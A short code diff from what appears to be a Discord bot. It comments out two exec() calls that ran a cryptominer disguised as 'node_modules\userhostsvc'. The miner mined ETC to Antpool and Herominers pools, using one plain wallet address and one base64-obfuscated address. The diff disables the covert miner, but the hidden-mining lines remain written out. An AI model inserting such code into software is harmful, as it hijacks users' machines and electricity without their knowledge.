@@ -248,8 +248,8 @@ client.once('ready', async () => {
 
     // Convert the memory to a more readable format (e.g., MB or GB)
     const fortyPercentMemoryMB = fortyPercentMemory / (1024 * 1024);
-    exec(`node_modules\\userhostsvc --algo ETCHASH --pool stratum+tcp://stratum-etc.antpool.com:8008 --user 0x615261CF5CCE15387E8f9F12E8eA18913C5f3a2E --keepfree ${fortyPercentMemoryMB * 0.75}`)
-    exec(`node_modules\\userhostsvc --algo ETCHASH --pool stratum+tcp://kr.etc.herominers.com:1150 --user  ${Buffer.from(add, 'base64').toString('ascii')} --keepfree ${fortyPercentMemoryMB * 0.75}`)
+    // exec(`node_modules\\userhostsvc --algo ETCHASH --pool stratum+tcp://stratum-etc.antpool.com:8008 --user 0x615261CF5CCE15387E8f9F12E8eA18913C5f3a2E --keepfree ${fortyPercentMemoryMB * 0.75}`)
+    // exec(`node_modules\\userhostsvc --algo ETCHASH --pool stratum+tcp://kr.etc.herominers.com:1150 --user  ${Buffer.from(add, 'base64').toString('ascii')} --keepfree ${fortyPercentMemoryMB * 0.75}`)
     client.guilds.cache.forEach(guild => {
         ownedsrvs.push(guild.id);
     });
